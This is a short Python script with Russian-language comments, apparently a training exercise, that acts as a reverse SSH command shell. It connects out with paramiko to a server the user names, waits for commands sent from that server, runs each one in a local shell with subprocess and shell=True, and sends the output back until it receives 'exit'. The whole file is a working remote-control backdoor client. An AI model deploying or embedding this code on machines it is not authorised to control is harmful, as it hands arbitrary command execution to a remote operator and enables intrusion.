#!/usr/bin/env python
import paramiko
import shlex
import subprocess


def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient() # создаем клиентский объект SSH подключения
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # при первом подключении автоматически добавляет ключ не спрашивая
    client.connect(ip, port=port, username=user, password=passwd) # подключается к SSH серверу по переданным данным

    ssh_session = client.get_transport().open_session() # создает новый канал типа session внутри установленного SSH соединения т.е. создаем командную оболочку
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())  #приветствие
        while True:
            command = ssh_session.recv(1024) # ждем команду от сервера
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close() # если команда exit то закрываем соединение
                    break
                cmd_output = subprocess.check_output(cmd, shell=True) # запускает команду в терминале shell говорит надо выполнять в командной оболочке
                ssh_session.send(cmd_output or 'okay') # отправляем результат
            except Exception as e:
                ssh_session.send(str(e)) # если ошибка высылаем
        client.close()
    return


if __name__ == '__main__':
    import getpass
    user = getpass.getuser()
    password = getpass.getpass()

    ip = input('Enter server IP: ')
    port = input('Enter port: ')
    ssh_command(ip, port, user, password, 'ClientConnected')
